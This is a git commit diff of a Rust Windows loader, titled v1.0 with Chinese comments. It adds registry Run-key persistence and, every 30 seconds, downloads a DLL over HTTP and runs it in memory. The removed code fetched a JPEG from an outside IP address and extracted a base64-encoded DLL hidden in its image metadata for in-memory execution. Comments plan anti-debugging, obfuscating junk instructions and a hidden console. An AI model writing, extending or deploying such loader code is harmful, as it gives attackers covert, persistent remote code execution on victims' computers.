bcbbabd6f9c92c8ee41b74f43120422c960fe62d
siwatermelon <119751595+siwatermelon@users.noreply.github.com>
2023-05-16 00:36:16 +0800

    v1.0
    添加了计划任务自启动,还需要去掉windows黑框

--- src/main.rs
+++ src/main.rs
@@ -1,62 +1,44 @@
-use std::{fs::File, io::Write};
+use std::path::Path;
+use winreg::enums::*;
+use winreg::RegKey;
 use std::thread;
 use std::time::Duration;
+use memexec::memexec_dll;
 use memexec::peloader::def::DLL_PROCESS_ATTACH;
-// use rexiv2::Metadata;
-
 use reqwest::{blocking::Client};
 
+
 fn main() {
+    // hide_console_window();
     // 创建 HTTP 客户端
     let client = Client::new();
     let mut buf = vec![];
+    //花指令、反调试
+
+    //自启动操作
+    // let key = r#"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"#;
+    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
+    let path = Path::new("Software").join("Microsoft").join("Windows").join("CurrentVersion").join("Run");
+    let (key, disp) = hkcu.create_subkey(&path).unwrap();
+    key.set_value("Path", &"\"C:\\Users\\Public\\test.exe\"").unwrap();
     loop {
-        // 创建 GET 请求
         let request = client
-            .get("http://173.82.58.11:8000/logo.jpg")
+            .get("http://127.0.0.1:8000/hello.dll")
             .build().expect("fail");
-
-        // 发送请求并获取响应
         let response: Result<reqwest::blocking::Response, reqwest::Error> = client.execute(request);
-        // println!("{:?}",response);
-
         if let Ok(mut response) = response {
-            // 读取响应体中的数据并将其写入文件
-            // let mut file = File::create("logo.jpg").unwrap();
-            // copy(&mut response, &mut file).unwrap();
             // println!("{:?}",response);
-            response.copy_to(&mut buf).unwrap();
-            read_meta(&buf);
+            response.copy_to(&mut buf).expect("get respponse fail...");
+            //内存加载dll
+            unsafe {
+                // DLL's entry point is DllMain
+                memexec_dll(&buf, 0 as _, DLL_PROCESS_ATTACH, 0 as _).expect("fail to get ....");
+            }
             buf.clear();
-
         }
-        
-        // 暂停 10 分钟
-        thread::sleep(Duration::from_secs(10 * 60));
+        thread::sleep(Duration::from_secs(1 * 30));
     }
 }
-
-fn read_meta(response:&Vec<u8>) {
-    // read
-    println!("{:?}",&response);
-    let meta = rexiv2::Metadata::new_from_buffer(&response).expect("error");
-    let encode_dll = meta.get_tag_string("Iptc.Application2.Keywords").expect("read fail due to the file size is too much.....");
-    // println!("{:?}", encode_dll);
-    //解析出dll
-
-    let dll = base64::decode(encode_dll).expect("decode fail");
-
-    // let mut file = File::create("buffer.dll").expect("Failed to create file");
-    // let mut offset = 0;
-    // while offset < dll.len() {
-    // let bytes_written = file.write(&dll[offset..]).expect("Failed to write to file");
-    // offset += bytes_written;
-    // }
-
-    //内存加载dll
-    unsafe {
-        // DLL's entry point is DllMain
-        memexec_dll(&dll, 0 as _, DLL_PROCESS_ATTACH, 0 as _).unwrap();
-    }
-
-}
+// fn hide_console_window() {
+//     unsafe { winapi::um::wincon::FreeConsole() };
+// }
